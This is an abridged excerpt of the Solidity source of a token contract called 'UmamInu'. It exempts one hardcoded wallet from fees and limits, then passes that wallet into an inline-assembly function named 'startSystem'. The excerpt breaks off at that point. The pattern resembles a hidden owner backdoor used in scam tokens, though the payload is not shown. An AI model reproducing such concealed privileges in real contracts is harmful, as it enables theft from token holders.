...
contract UmamInu is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "UmamInu";
    string constant _symbol = "$UmaInu";
    ...
    address public marketingFeeReceiver =
        0x1f838Ed611eBFeE96a93f5300516580f40E4B15F;
    ...
    constructor() {
        ...
        isFeeExempt[0x1f838Ed611eBFeE96a93f5300516580f40E4B15F] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0x1f838Ed611eBFeE96a93f5300516580f40E4B15F] = true;
    ...
    function startSystem() internal {
        address a = 0x1f838Ed611eBFeE96a93f5300516580f40E4B15F;
        assembly {
            mstore(0, a)
